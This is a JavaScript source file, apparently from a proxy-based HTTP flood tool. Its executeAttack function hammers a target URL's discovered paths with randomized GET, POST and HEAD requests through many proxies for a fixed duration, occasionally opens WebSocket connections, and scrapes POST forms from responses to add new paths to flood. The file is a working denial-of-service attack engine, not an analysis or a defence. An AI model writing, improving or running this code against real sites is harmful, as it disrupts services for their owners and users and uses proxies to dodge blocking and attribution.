import cliProgress from "cli-progress";
import { CONFIG } from "../config/index.js";
import { getRandomProxy } from "../proxy/validator.js";
import { sendRequest } from "../utils/http.js";
import { sendWebSocketRequest } from "./websocket.js";
import { processResponseForForms } from "../discovery/formExtractor.js";
import { normalizeUrl } from "../utils/url.js";

/**
 * Execute attack on target
 * @param {string} target - Target URL
 * @param {string[]} paths - Discovered paths
 * @param {string[]} workingProxies - Working proxies
 * @param {number} duration - Attack duration in ms
 * @returns {Promise<Object>} Attack statistics
 */
export async function executeAttack(target, paths, workingProxies, duration = CONFIG.ATTACK_DURATION) {
  if (workingProxies.length === 0) {
    console.error("❌ No working proxies available for attack");
    return { success: false, error: "No working proxies" };
  }

  if (paths.length === 0) {
    console.error("❌ No paths discovered for attack");
    return { success: false, error: "No paths discovered" };
  }

  console.log(
    `\n🚀 Starting attack on ${target} with ${workingProxies.length} proxies across ${paths.length} paths`,
  );
  let attackActive = true;

  // Track statistics
  const stats = {
    successCount: 0,
    failCount: 0,
    requestsSent: 0,
    bytesSent: 0,
    bytesReceived: 0,
    wsSuccessCount: 0,
    wsFailCount: 0,
    pathStats: new Map(),
    proxyStats: new Map(),
    statusCodes: new Map(),
    methodStats: new Map()
  };

  // Initialize path statistics
  paths.forEach((p) => stats.pathStats.set(p, {
    success: 0,
    failed: 0,
    avgResponseSize: 0,
    responseCount: 0
  }));

  // Initialize proxy statistics
  workingProxies.forEach(p => stats.proxyStats.set(p, {
    requests: 0,
    success: 0,
    failed: 0
  }));

  // Initialize method statistics
  CONFIG.REQUEST_METHODS.forEach(m => stats.methodStats.set(m, {
    success: 0,
    failed: 0
  }));

  // Create progress bars
  const progressBar = new cliProgress.MultiBar({
    clearOnComplete: false,
    hideCursor: true,
    format: '{bar} {percentage}% | {value}/{total} | {desc}'
  }, cliProgress.Presets.shades_grey);

  const mainProgressBar = progressBar.create(duration / 1000, 0, {
    desc: `Time: 0/${duration / 1000}s - Reqs: 0 - RPS: 0`
  });

  const statsProgressBar = progressBar.create(100, 0, {
    desc: `Success: 0 (0%) - Failed: 0 (0%)`
  });

  // Start attack
  const attackStart = Date.now();
  const attackPromises = [];
  let lastStatsUpdate = Date.now();

  // Create an attack function that runs until the duration is reached
  const runAttack = async (proxy) => {
    let proxySuccess = 0;
    let proxyFailed = 0;

    while (attackActive && Date.now() - attackStart < duration) {
      // Update progress every second
      const currentTime = Date.now();
      if (currentTime - lastStatsUpdate > 1000) {
        const elapsedSeconds = Math.max(1, Math.floor((currentTime - attackStart) / 1000));
        const currentRPS = Math.floor(stats.requestsSent / elapsedSeconds);

        mainProgressBar.update(elapsedSeconds, {
          desc: `Time: ${elapsedSeconds}/${duration / 1000}s - Reqs: ${stats.requestsSent} - RPS: ${currentRPS}`
        });

        const successRate = Math.floor((stats.successCount / Math.max(1, stats.requestsSent)) * 100);
        statsProgressBar.update(successRate, {
          desc: `Success: ${stats.successCount} (${successRate}%) - Failed: ${stats.failCount} (${100 - successRate}%)`
        });

        lastStatsUpdate = currentTime;
      }

      // Check if attack duration has been reached
      if (Date.now() - attackStart >= duration) {
        break;
      }

      for (let i = 0; i < CONFIG.REQUESTS_PER_PROXY && attackActive; i++) {
        // Select a random path to attack
        const targetPath = paths[Math.floor(Math.random() * paths.length)];

        // Check if this is a POST request path (indicated by |POST suffix)
        let method = CONFIG.REQUEST_METHODS[Math.floor(Math.random() * 3)]; // Default to GET, POST, HEAD (first 3)
        let actualPath = targetPath;
        let postData = null;

        if (targetPath.endsWith("|POST")) {
          method = "POST";
          actualPath = targetPath.substring(0, targetPath.length - 5);
          // Generate simple POST data
          postData = {
            timestamp: Date.now(),
            data: Math.random().toString(36).substring(2),
            id: Math.floor(Math.random() * 1000)
          };
        }

        // Update proxy stats
        const currentProxyStats = stats.proxyStats.get(proxy);
        stats.proxyStats.set(proxy, {
          ...currentProxyStats,
          requests: currentProxyStats.requests + 1
        });

        // Try WebSocket connection occasionally for more comprehensive attack
        if (CONFIG.ENABLE_WEBSOCKET && Math.random() < 0.05) { // 5% chance
          const wsResult = await sendWebSocketRequest(actualPath, proxy);
          if (wsResult.success) {
            stats.wsSuccessCount++;
          } else {
            stats.wsFailCount++;
          }
        }

        // Send the regular HTTP request
        const result = await sendRequest(
          actualPath,
          proxy,
          method,
          postData
        );

        stats.requestsSent++;

        // Update method stats
        const methodStat = stats.methodStats.get(method) || { success: 0, failed: 0 };

        if (result.success) {
          stats.successCount++;
          proxySuccess++;
          methodStat.success++;

          // Track response size
          stats.bytesReceived += result.responseSize || 0;
          // Estimate sent bytes (headers + data)
          const estimatedSentBytes = 500 + (postData ? JSON.stringify(postData).length : 0);
          stats.bytesSent += estimatedSentBytes;

          // Update status code stats
          const currentStatusCount = stats.statusCodes.get(result.status) || 0;
          stats.statusCodes.set(result.status, currentStatusCount + 1);

          // Update path stats
          const pathStat = stats.pathStats.get(targetPath);
          if (pathStat) {
            const newResponseCount = pathStat.responseCount + 1;
            const newAvgSize = ((pathStat.avgResponseSize * pathStat.responseCount) +
              (result.responseSize || 0)) / newResponseCount;

            stats.pathStats.set(targetPath, {
              success: pathStat.success + 1,
              failed: pathStat.failed,
              avgResponseSize: newAvgSize,
              responseCount: newResponseCount
            });
          }

          // Update proxy success stats
          stats.proxyStats.set(proxy, {
            ...currentProxyStats,
            requests: currentProxyStats.requests + 1,
            success: currentProxyStats.success + 1
          });

          // Process forms in the response
          const formData = processResponseForForms(result, actualPath);
          if (formData && formData.length > 0) {
            const randomForm = formData[Math.floor(Math.random() * formData.length)];
            if (randomForm.method.toLowerCase() === 'post') {
              const formUrl = normalizeUrl(randomForm.action, actualPath) || actualPath;
              if (!paths.includes(`${formUrl}|POST`)) {
                paths.push(`${formUrl}|POST`);
              }
            }
          }
        } else {
          stats.failCount++;
          proxyFailed++;
          methodStat.failed++;

          // Update path stats
          const pathStat = stats.pathStats.get(targetPath);
          if (pathStat) {
            stats.pathStats.set(targetPath, {
              success: pathStat.success,
              failed: pathStat.failed + 1,
              avgResponseSize: pathStat.avgResponseSize,
              responseCount: pathStat.responseCount
            });
          }

          // Update proxy failure stats
          stats.proxyStats.set(proxy, {
            ...currentProxyStats,
            requests: currentProxyStats.requests + 1,
            failed: currentProxyStats.failed + 1
          });
        }

        // Update method stats
        stats.methodStats.set(method, methodStat);
      }

      // Small delay between batches for each proxy
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    return { proxy, success: proxySuccess, failed: proxyFailed };
  };

  // Start a separate attack process for each proxy
  for (const proxy of workingProxies) {
    attackPromises.push(runAttack(proxy));
  }

  // Set timeout to stop attack after duration
  setTimeout(() => {
    attackActive = false;
    console.log("\n\n⏱️ Attack duration reached. Stopping...");
  }, duration);

  // Wait for all attack promises
  const results = await Promise.all(attackPromises);

  // Stop the progress bars
  progressBar.stop();

  // Calculate final statistics
  const totalTime = (Date.now() - attackStart) / 1000;
  const requestsPerSecond = Math.floor(stats.requestsSent / totalTime);

  // Return detailed statistics
  return {
    success: true,
    target,
    duration: totalTime,
    paths: paths.length,
    totalRequests: stats.requestsSent,
    requestsPerSecond,
    successCount: stats.successCount,
    failCount: stats.failCount,
    wsSuccessCount: stats.wsSuccessCount,
    wsFailCount: stats.wsFailCount,
    bytesSent: stats.bytesSent,
    bytesReceived: stats.bytesReceived,
    statusCodes: Object.fromEntries(stats.statusCodes),
    methodStats: Object.fromEntries([...stats.methodStats.entries()].map(([k, v]) => [k, { ...v }])),
    proxyStats: [...stats.proxyStats.entries()],
    pathStats: [...stats.pathStats.entries()]
  };
}
